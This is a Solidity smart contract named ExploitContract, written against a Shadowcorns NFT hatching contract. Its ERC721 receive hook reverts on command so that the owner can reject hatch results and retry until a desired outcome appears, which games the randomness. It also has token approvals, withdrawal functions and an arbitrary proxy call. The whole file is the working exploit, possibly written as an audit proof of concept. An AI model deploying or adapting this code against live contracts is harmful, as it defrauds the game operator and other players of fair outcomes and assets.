// SPDX-License-Identifier: Apache-2.0
pragma solidity ^0.8.9;

import "@openzeppelin-contracts/contracts/token/ERC721/IERC721Receiver.sol";
import "@openzeppelin-contracts/contracts/token/ERC721/IERC721.sol";
import "@openzeppelin-contracts/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin-contracts/contracts/token/ERC1155/IERC1155.sol";
import "@openzeppelin-contracts/contracts/token/ERC1155/utils/ERC1155Holder.sol";
import "@openzeppelin-contracts/contracts/access/Ownable.sol";
import "./IShadowcorns.sol";

contract ExploitContract is IERC721Receiver, Ownable, ERC1155Holder {
    bool public needToRevert = true;
    address public shadowcornsContract;
    address public unimContract;
    address public rbwContract;

    uint256 public retriedCount = 0;

    constructor(
        address _shadowcornsContract,
        address _unimContract,
        address _rbwContract
    ) public {
        shadowcornsContract = _shadowcornsContract;
        unimContract = _unimContract;
        rbwContract = _rbwContract;

        uint256 amountToApprove = 10**18 * 1000000;
        IERC20 rbw = IERC20(rbwContract);
        rbw.approve(_shadowcornsContract, amountToApprove);
        IERC20 unim = IERC20(unimContract);
        unim.approve(_shadowcornsContract, amountToApprove);
    }

    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external returns (bytes4) {
        if (needToRevert) {
            // Here should be checked the stats of shadowcorn
            revert("");
        }
        return this.onERC721Received.selector;
    }

    function _shadowcorns() internal view returns (IShadowcorns) {
        return IShadowcorns(shadowcornsContract);
    }

    function setNeedToRevert(bool _needToRevert) public onlyOwner {
        needToRevert = _needToRevert;
    }

    function beginHatching(uint256 terminusPoolId) public onlyOwner {
        _shadowcorns().beginHatching(terminusPoolId);
    }

    function retryHatching(uint256 tokenId) public onlyOwner {
        _shadowcorns().retryHatching(tokenId);
        retriedCount++;
    }

    function withdrawERC20(address tokenContract, uint256 amount)
        public
        onlyOwner
    {
        IERC20 token = IERC20(tokenContract);
        token.transfer(msg.sender, amount);
    }

    function withdrawErc721(address tokenAddress, uint256 tokenId)
        public
        onlyOwner
    {
        IERC721 erc721 = IERC721(tokenAddress);
        erc721.transferFrom(address(this), msg.sender, tokenId);
    }

    function withdrawErc1155(address tokenAddress, uint256 tokenId)
        public
        onlyOwner
    {
        IERC1155 erc1155 = IERC1155(tokenAddress);
        erc1155.safeTransferFrom(address(this), msg.sender, tokenId, 1, "");
    }

    function proxyCall(address _to, bytes calldata _data) public onlyOwner {
        _to.call(_data);
    }
}
